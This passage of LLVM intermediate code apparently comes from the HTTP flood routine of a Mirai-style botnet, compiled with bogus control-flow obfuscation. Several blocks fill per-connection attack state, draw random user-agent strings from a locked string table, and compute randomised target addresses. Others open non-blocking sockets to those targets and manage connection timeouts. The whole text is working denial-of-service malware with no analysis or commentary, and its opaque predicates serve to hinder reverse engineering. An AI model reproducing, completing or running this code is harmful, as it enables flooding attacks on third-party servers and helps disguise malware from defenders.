  %284 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i32 0, i32 6
  %286 = getelementptr inbounds [257 x i8], [257 x i8]* %285, i64 0, i64 0
  store i8 47, i8* %286, align 4
  br label %287

; <label>:287:                                    ; preds = %259, %217
  %288 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %291, i32 0, i32 10
  %293 = getelementptr inbounds [9 x i8], [9 x i8]* %292, i32 0, i32 0
  %294 = load i8*, i8** %15, align 8
  %295 = call i32 @util_strcpy(i8* %293, i8* %294)
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 9
  %301 = getelementptr inbounds [9 x i8], [9 x i8]* %300, i32 0, i32 0
  %302 = load i8*, i8** %15, align 8
  %303 = call i32 @util_strcpy(i8* %301, i8* %302)
  %304 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %307, i32 0, i32 7
  %309 = getelementptr inbounds [129 x i8], [129 x i8]* %308, i32 0, i32 0
  %310 = load i8*, i8** %16, align 8
  %311 = call i32 @util_strcpy(i8* %309, i8* %310)
  %312 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %313 = load i32, i32* %9, align 4
  %314 = load i8, i8* %5, align 1
  %315 = zext i8 %314 to i32
  %316 = srem i32 %313, %315
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 2
  %320 = load i8, i8* %319, align 4
  %321 = zext i8 %320 to i32
  %322 = icmp slt i32 %321, 32
  br i1 %322, label %323, label %353

; <label>:323:                                    ; preds = %287
  %324 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %325 = load i32, i32* %9, align 4
  %326 = load i8, i8* %5, align 1
  %327 = zext i8 %326 to i32
  %328 = srem i32 %325, %327
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i64 %329
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %330, i32 0, i32 1
  %332 = load i32, i32* %331, align 4
  %333 = call i32 @ntohl(i32 %332) #7
  %334 = call i32 @rand_next()
  %335 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %336 = load i32, i32* %9, align 4
  %337 = load i8, i8* %5, align 1
  %338 = zext i8 %337 to i32
  %339 = srem i32 %336, %338
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i64 %340
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i32 0, i32 2
  %343 = load i8, i8* %342, align 4
  %344 = zext i8 %343 to i32
  %345 = lshr i32 %334, %344
  %346 = add i32 %333, %345
  %347 = call i32 @htonl(i32 %346) #7
  %348 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %351, i32 0, i32 4
  store i32 %347, i32* %352, align 4
  br label %353

; <label>:353:                                    ; preds = %323, %287
  %354 = call i32 @rand_next()
  %355 = urem i32 %354, 5
  switch i32 %355, label %417 [
    i32 0, label %356
    i32 1, label %365
    i32 2, label %374
    i32 3, label %383
    i32 4, label %392
  ]

; <label>:356:                                    ; preds = %353
  call void @table_unlock_val(i8 zeroext 63)
  %357 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %360, i32 0, i32 5
  %362 = getelementptr inbounds [512 x i8], [512 x i8]* %361, i32 0, i32 0
  %363 = call i8* @table_retrieve_val(i32 63, i32* null)
  %364 = call i32 @util_strcpy(i8* %362, i8* %363)
  call void @table_lock_val(i8 zeroext 63)
  br label %417

; <label>:365:                                    ; preds = %353
  call void @table_unlock_val(i8 zeroext 64)
  %366 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %369, i32 0, i32 5
  %371 = getelementptr inbounds [512 x i8], [512 x i8]* %370, i32 0, i32 0
  %372 = call i8* @table_retrieve_val(i32 64, i32* null)
  %373 = call i32 @util_strcpy(i8* %371, i8* %372)
  call void @table_lock_val(i8 zeroext 64)
  br label %417

; <label>:374:                                    ; preds = %353
  call void @table_unlock_val(i8 zeroext 65)
  %375 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %378, i32 0, i32 5
  %380 = getelementptr inbounds [512 x i8], [512 x i8]* %379, i32 0, i32 0
  %381 = call i8* @table_retrieve_val(i32 65, i32* null)
  %382 = call i32 @util_strcpy(i8* %380, i8* %381)
  call void @table_lock_val(i8 zeroext 65)
  br label %417

; <label>:383:                                    ; preds = %353
  call void @table_unlock_val(i8 zeroext 66)
  %384 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %387, i32 0, i32 5
  %389 = getelementptr inbounds [512 x i8], [512 x i8]* %388, i32 0, i32 0
  %390 = call i8* @table_retrieve_val(i32 66, i32* null)
  %391 = call i32 @util_strcpy(i8* %389, i8* %390)
  call void @table_lock_val(i8 zeroext 66)
  br label %417

; <label>:392:                                    ; preds = %353
  %393 = load i32, i32* @x.17
  %394 = load i32, i32* @y.18
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %392
  call void @table_unlock_val(i8 zeroext 67)
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 5
  %406 = getelementptr inbounds [512 x i8], [512 x i8]* %405, i32 0, i32 0
  %407 = call i8* @table_retrieve_val(i32 67, i32* null)
  %408 = call i32 @util_strcpy(i8* %406, i8* %407)
  call void @table_lock_val(i8 zeroext 67)
  %409 = load i32, i32* @x.17
  %410 = load i32, i32* @y.18
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %417

; <label>:417:                                    ; preds = %originalBBpart218, %383, %374, %365, %356, %353
  %418 = load i32, i32* @x.17
  %419 = load i32, i32* @y.18
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %417
  %426 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %427 = load i32, i32* %9, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %426, i64 %428
  %430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i32 0, i32 6
  %431 = getelementptr inbounds [257 x i8], [257 x i8]* %430, i32 0, i32 0
  %432 = load i8*, i8** %17, align 8
  %433 = call i32 @util_strcpy(i8* %431, i8* %432)
  %434 = load i32, i32* @x.17
  %435 = load i32, i32* @y.18
  %436 = sub i32 %434, 1
  %437 = mul i32 %434, %436
  %438 = urem i32 %437, 2
  %439 = icmp eq i32 %438, 0
  %440 = icmp slt i32 %435, 10
  %441 = or i1 %439, %440
  br i1 %441, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %442

; <label>:442:                                    ; preds = %originalBBpart222
  %443 = load i32, i32* %9, align 4
  %444 = add nsw i32 %443, 1
  store i32 %444, i32* %9, align 4
  br label %213

; <label>:445:                                    ; preds = %213
  %446 = load i32, i32* @x.17
  %447 = load i32, i32* @y.18
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %445
  %454 = load i32, i32* @x.17
  %455 = load i32, i32* @y.18
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %462

; <label>:462:                                    ; preds = %4140, %1344, %1318, %originalBBpart227
  store i32 0, i32* %23, align 4
  %463 = call i64 @time(i64* null) #6
  %464 = trunc i64 %463 to i32
  store i32 %464, i32* %27, align 4
  br label %465

; <label>:465:                                    ; preds = %462
  %466 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %467 = getelementptr inbounds [16 x i64], [16 x i64]* %466, i64 0, i64 0
  %468 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %467) #6, !srcloc !1
  %469 = extractvalue { i64, i64* } %468, 0
  %470 = extractvalue { i64, i64* } %468, 1
  %471 = trunc i64 %469 to i32
  store i32 %471, i32* %28, align 4
  %472 = ptrtoint i64* %470 to i64
  %473 = trunc i64 %472 to i32
  store i32 %473, i32* %29, align 4
  br label %474

; <label>:474:                                    ; preds = %465
  %475 = load i32, i32* @x.17
  %476 = load i32, i32* @y.18
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %474
  %483 = load i32, i32* @x.17
  %484 = load i32, i32* @y.18
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %491

; <label>:491:                                    ; preds = %originalBBpart231
  %492 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %493 = getelementptr inbounds [16 x i64], [16 x i64]* %492, i64 0, i64 0
  %494 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %493) #6, !srcloc !2
  %495 = extractvalue { i64, i64* } %494, 0
  %496 = extractvalue { i64, i64* } %494, 1
  %497 = trunc i64 %495 to i32
  store i32 %497, i32* %30, align 4
  %498 = ptrtoint i64* %496 to i64
  %499 = trunc i64 %498 to i32
  store i32 %499, i32* %31, align 4
  br label %500

; <label>:500:                                    ; preds = %491
  %501 = load i32, i32* @x.17
  %502 = load i32, i32* @y.18
  %503 = sub i32 %501, 1
  %504 = mul i32 %501, %503
  %505 = urem i32 %504, 2
  %506 = icmp eq i32 %505, 0
  %507 = icmp slt i32 %502, 10
  %508 = or i1 %506, %507
  br i1 %508, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %500
  store i32 0, i32* %9, align 4
  %509 = load i32, i32* @x.17
  %510 = load i32, i32* @y.18
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %517

; <label>:517:                                    ; preds = %1312, %originalBBpart235
  %518 = load i32, i32* %9, align 4
  %519 = load i32, i32* %18, align 4
  %520 = icmp slt i32 %518, %519
  br i1 %520, label %521, label %1315

; <label>:521:                                    ; preds = %517
  %522 = load i32, i32* @x.17
  %523 = load i32, i32* @y.18
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %521
  %530 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %531 = load i32, i32* %9, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %530, i64 %532
  store %struct.attack_http_state* %533, %struct.attack_http_state** %26, align 8
  %534 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %534, i32 0, i32 1
  %536 = load i8, i8* %535, align 4
  %537 = zext i8 %536 to i32
  %538 = icmp eq i32 %537, 1
  %539 = load i32, i32* @x.17
  %540 = load i32, i32* @y.18
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %538, label %547, label %575

; <label>:547:                                    ; preds = %originalBBpart239
  %548 = load i32, i32* @x.17
  %549 = load i32, i32* @y.18
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %547
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 12
  %558 = load i32, i32* %557, align 4
  %559 = icmp ne i32 %558, 0
  %560 = load i32, i32* @x.17
  %561 = load i32, i32* @y.18
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %559, label %568, label %571

; <label>:568:                                    ; preds = %originalBBpart243
  %569 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %570 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %569, i32 0, i32 1
  store i8 4, i8* %570, align 4
  br label %574

; <label>:571:                                    ; preds = %originalBBpart243
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 1
  store i8 0, i8* %573, align 4
  br label %574

; <label>:574:                                    ; preds = %571, %568
  br label %575

; <label>:575:                                    ; preds = %574, %originalBBpart239
  %576 = load i32, i32* @x.17
  %577 = load i32, i32* @y.18
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %575
  %584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %584, i32 0, i32 1
  %586 = load i8, i8* %585, align 4
  %587 = zext i8 %586 to i32
  %588 = icmp eq i32 %587, 0
  %589 = load i32, i32* @x.17
  %590 = load i32, i32* @y.18
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %588, label %597, label %693

; <label>:597:                                    ; preds = %originalBBpart247
  %598 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %598, i8 0, i64 16, i32 4, i1 false)
  %599 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 4
  %602 = icmp ne i32 %601, -1
  br i1 %602, label %603, label %608

; <label>:603:                                    ; preds = %597
  %604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %604, i32 0, i32 0
  %606 = load i32, i32* %605, align 4
  %607 = call i32 @close(i32 %606)
  br label %608

; <label>:608:                                    ; preds = %603, %597
  %609 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %610, i32 0, i32 0
  store i32 %609, i32* %611, align 4
  %612 = icmp eq i32 %609, -1
  br i1 %612, label %613, label %614

; <label>:613:                                    ; preds = %608
  br label %1312

; <label>:614:                                    ; preds = %608
  %615 = load i32, i32* @x.17
  %616 = load i32, i32* @y.18
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %614
  %623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %623, i32 0, i32 0
  %625 = load i32, i32* %624, align 4
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 0
  %628 = load i32, i32* %627, align 4
  %629 = call i32 (i32, i32, ...) @fcntl(i32 %628, i32 3, i32 0)
  %630 = or i32 2048, %629
  %631 = call i32 (i32, i32, ...) @fcntl(i32 %625, i32 4, i32 %630)
  store i32 65535, i32* %10, align 4
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 0
  %634 = load i32, i32* %633, align 4
  %635 = bitcast i32* %10 to i8*
  %636 = call i32 @setsockopt(i32 %634, i32 0, i32 8, i8* %635, i32 4) #6
  %637 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %637, align 4
  %638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %638, i32 0, i32 4
  %640 = load i32, i32* %639, align 4
  %641 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %642 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %641, i32 0, i32 0
  store i32 %640, i32* %642, align 4
  %643 = load i16, i16* %19, align 2
  %644 = call zeroext i16 @htons(i16 zeroext %643) #7
  %645 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %644, i16* %645, align 2
  %646 = load i32, i32* %27, align 4
  %647 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %647, i32 0, i32 2
  store i32 %646, i32* %648, align 4
  %649 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %650 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %649, i32 0, i32 1
  store i8 2, i8* %650, align 4
  %651 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %652 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 4
  %654 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %655 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %655, %struct.sockaddr** %654, align 8
  %656 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %657 = load %struct.sockaddr*, %struct.sockaddr** %656, align 8
  %658 = call i32 @connect(i32 %653, %struct.sockaddr* %657, i32 16)
  %659 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %659, i32 0, i32 0
  %661 = load i32, i32* %660, align 4
  %662 = srem i32 %661, 64
  %663 = zext i32 %662 to i64
  %664 = shl i64 1, %663
  %665 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %666, i32 0, i32 0
  %668 = load i32, i32* %667, align 4
  %669 = sdiv i32 %668, 64
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds [16 x i64], [16 x i64]* %665, i64 0, i64 %670
  %672 = load i64, i64* %671, align 8
  %673 = or i64 %672, %664
  store i64 %673, i64* %671, align 8
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i32 0, i32 0
  %676 = load i32, i32* %675, align 4
  %677 = load i32, i32* %23, align 4
  %678 = icmp sgt i32 %676, %677
  %679 = load i32, i32* @x.17
  %680 = load i32, i32* @y.18
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBBpart279, label %originalBB49alteredBB

originalBBpart279:                                ; preds = %originalBB49
  br i1 %678, label %687, label %692

; <label>:687:                                    ; preds = %originalBBpart279
  %688 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %689 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %688, i32 0, i32 0
  %690 = load i32, i32* %689, align 4
  %691 = add nsw i32 %690, 1
  store i32 %691, i32* %23, align 4
  br label %692

; <label>:692:                                    ; preds = %687, %originalBBpart279
  br label %1311

; <label>:693:                                    ; preds = %originalBBpart247
  %694 = load i32, i32* @x.17
  %695 = load i32, i32* @y.18
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %693
  %702 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %702, i32 0, i32 1
  %704 = load i8, i8* %703, align 4
  %705 = zext i8 %704 to i32
  %706 = icmp eq i32 %705, 2
  %707 = load i32, i32* @x.17
  %708 = load i32, i32* @y.18
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %706, label %715, label %790

; <label>:715:                                    ; preds = %originalBBpart283
  %716 = load i32, i32* %27, align 4
  %717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %717, i32 0, i32 2
  %719 = load i32, i32* %718, align 4
  %720 = sub i32 %716, %719
  %721 = icmp ugt i32 %720, 30
  br i1 %721, label %722, label %747

; <label>:722:                                    ; preds = %715
  %723 = load i32, i32* @x.17
  %724 = load i32, i32* @y.18
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %722
  %731 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %732 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %731, i32 0, i32 1
  store i8 0, i8* %732, align 4
  %733 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %734 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %733, i32 0, i32 0
  %735 = load i32, i32* %734, align 4
  %736 = call i32 @close(i32 %735)
  %737 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %738 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %737, i32 0, i32 0
  store i32 -1, i32* %738, align 4
  %739 = load i32, i32* @x.17
  %740 = load i32, i32* @y.18
  %741 = sub i32 %739, 1
  %742 = mul i32 %739, %741
  %743 = urem i32 %742, 2
  %744 = icmp eq i32 %743, 0
  %745 = icmp slt i32 %740, 10
  %746 = or i1 %744, %745
  br i1 %746, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %1312

; <label>:747:                                    ; preds = %715
  %748 = load i32, i32* @x.17
  %749 = load i32, i32* @y.18
  %750 = sub i32 %748, 1
  %751 = mul i32 %748, %750
  %752 = urem i32 %751, 2
  %753 = icmp eq i32 %752, 0
  %754 = icmp slt i32 %749, 10
  %755 = or i1 %753, %754
  br i1 %755, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %747
  %756 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %757 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 4
  %759 = srem i32 %758, 64
  %760 = zext i32 %759 to i64
  %761 = shl i64 1, %760
  %762 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %763 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %764 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 4
  %766 = sdiv i32 %765, 64
  %767 = sext i32 %766 to i64
  %768 = getelementptr inbounds [16 x i64], [16 x i64]* %762, i64 0, i64 %767
  %769 = load i64, i64* %768, align 8
  %770 = or i64 %769, %761
  store i64 %770, i64* %768, align 8
  %771 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %772 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %771, i32 0, i32 0
  %773 = load i32, i32* %772, align 4
  %774 = load i32, i32* %23, align 4
  %775 = icmp sgt i32 %773, %774
  %776 = load i32, i32* @x.17
  %777 = load i32, i32* @y.18
  %778 = sub i32 %776, 1
  %779 = mul i32 %776, %778
  %780 = urem i32 %779, 2
  %781 = icmp eq i32 %780, 0
  %782 = icmp slt i32 %777, 10
  %783 = or i1 %781, %782
  br i1 %783, label %originalBBpart2140, label %originalBB89alteredBB

originalBBpart2140:                               ; preds = %originalBB89
  br i1 %775, label %784, label %789

